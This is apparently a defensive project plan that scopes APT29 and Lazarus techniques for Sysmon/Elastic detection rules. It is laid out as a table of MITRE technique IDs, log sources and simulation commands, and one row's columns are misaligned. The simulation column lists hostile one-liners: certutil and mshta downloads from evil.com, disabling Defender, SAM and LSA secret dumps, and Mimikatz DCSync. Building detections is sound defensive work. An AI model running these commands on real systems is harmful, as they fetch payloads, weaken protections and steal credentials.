# TTP Scope – APT Detection Project

## Selected APT Groups

* **APT29 (Cozy Bear)** — stealthy intrusions, heavy PowerShell usage, credential access, process injection, DCSync.
* **Lazarus Group** — persistence via registry/run keys & startup folders, LOLBins (mshta, rundll32), SMB/WMI lateral movement, tool staging.

## Detection Scope & Data Sources

* **Windows endpoint telemetry** via **Sysmon** (EIDs 1/3/8/11/13) and **Security logs** (4662, 5140) shipped by **Winlogbeat** to **Elastic**.
* Rule languages by use-case: **KQL** (single events), **EQL** (sequence/correlation), **ES|QL** (hunting/aggregation).
* **Sigma is source of truth**; we adapt/compile to Elastic query languages.

## Techniques in Scope (with rule language & simulation plan)

| Technique ID  | Name                                             | Primary Log Source(s)                                                          | Rule Lang | Sim / Trigger                                                           | Why in Scope                             | Mapping to Groups  |      |
| ------------- | ------------------------------------------------ | ------------------------------------------------------------------------------ | --------- | ----------------------------------------------------------------------- | ---------------------------------------- | ------------------ | ---- |
| **T1059.001** | PowerShell – EncodedCommand                      | Sysmon **EID 1** (ProcessCreate)                                               | **KQL**   | `powershell.exe -enc <b64>`                                             | Common obfuscation/execution path        | APT29, Lazarus     |      |
| **T1053.005** | Scheduled Task Creation                          | Sysmon **EID 1**                                                               | **KQL**   | `schtasks /create /sc onlogon ...`                                      | Persistence & execution                  | Both               |      |
| **T1047**     | WMI Execution                                    | Sysmon **EID 1**, optional **EID 3**                                           | **KQL**   | `wmic process call create "cmd /c calc"`                                | Remote execution/lateral move            | APT29              |      |
| **T1105**     | Ingress Tool Transfer                            | Sysmon **EID 3** (NetworkConnect), **EID 1** (`certutil.exe`, `bitsadmin.exe`) | **KQL**   | `certutil -urlcache -f http://evil.com/evil.exe`                        | Tool download                            | Lazarus            |      |
| **T1547.001** | Registry Run Keys / Startup Folder Persistence   | Sysmon **EID 13** (RegistrySet), **EID 11** (FileCreate)                       | **KQL**   | `reg add HKCU\Software\...\Run /v Evil` or drop `evil.lnk` in Startup   | Lightweight persistence                  | Both               |      |
| **T1218.010** | Regsvr32 (Squiblydoo)                            | Sysmon **EID 1**                                                               | **KQL**   | `regsvr32 /s /u /i:http://... scrobj.dll`                               | Signed binary proxy execution            | APT29              |      |
| **T1218.011** | Rundll32 Proxy Execution                         | Sysmon **EID 1**                                                               | **KQL**   | `rundll32.exe javascript:...`                                           | Execution proxy                          | Both               |      |
| **T1218.005** | Mshta Execution                                  | Sysmon **EID 1**                                                               | **KQL**   | `mshta http://evil.com/payload`                                         | LOLBin abuse                             | Lazarus            |      |
| **T1112**     | Modify Registry (Security Controls / IFEO / UAC) | Sysmon **EID 13**                                                              | **KQL**   | `reg add HKLM\...\Image File Execution Options\malware.exe /v Debugger` | Defense evasion                          | Both               |      |
| **T1562.001** | Disable/Weaken Security Tools                    | Sysmon **EID 1**, **EID 13**                                                   | **KQL**   | `powershell Set-MpPreference -DisableRealtimeMonitoring $true`          | Disable Defender                         | Both               |      |
| **T1569.002** | Service Execution                                | Sysmon **EID 1**                                                               | **KQL**   | `sc create evil binpath= C:\evil.exe`                                   | Privilege escalation & persistence       | Both               |      |
| **T1055**     | Process Injection (CreateRemoteThread)           | Sysmon **EID 8** (ProcessAccess)                                               | **EQL**   | Atomic Red Team process injection                                       | Stealthier in-memory execution           | APT29              |      |
| **T1021.002** | Lateral Movement via Admin Shares                | Security **5140**, Sysmon **EID 1/11**                                         | **KQL**   | `copy evil.exe \\target\ADMIN$\`                                        | Admin share abuse                        | Lazarus            |      |
| **T1573**     | Encrypted C2 over TLS                            | Sysmon **EID 3** (NetworkConnect)                                              | \*\*ES    | QL\*\*                                                                  | Sim TLS beaconing with Cobalt Strike     | Hidden C2 channels | Both |
| **T1003.002** | SAM Dump                                         | Sysmon **EID 1**, **EID 11**                                                   | **KQL**   | `reg save hklm\sam sam.hiv`                                             | Credential access                        | APT29              |      |
| **T1003.004** | LSA Secrets Dump                                 | Sysmon **EID 1**                                                               | **KQL**   | `reg query HKLM\SECURITY\Policy\Secrets`                                | Credential access                        | APT29              |      |
| **T1003.006** | DCSync                                           | Security **4662**                                                              | **KQL**   | Mimikatz `lsadump::dcsync`                                              | Credential access via replication rights | APT29              |      |
